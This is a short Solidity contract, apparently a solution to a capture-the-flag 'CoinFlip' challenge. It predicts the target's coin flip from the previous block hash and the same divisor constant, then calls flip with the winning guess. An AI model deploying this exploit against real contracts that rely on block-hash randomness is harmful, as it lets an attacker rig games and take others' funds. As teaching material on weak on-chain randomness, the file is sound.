// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

interface ICoinFlipChallenge  {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker {
    ICoinFlipChallenge  public challenge;

    constructor(address coinFlipAddress) {
        challenge = ICoinFlipChallenge (coinFlipAddress);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        bool side = coinFlip == 1 ? true : false;

        challenge.flip(side);
    }
}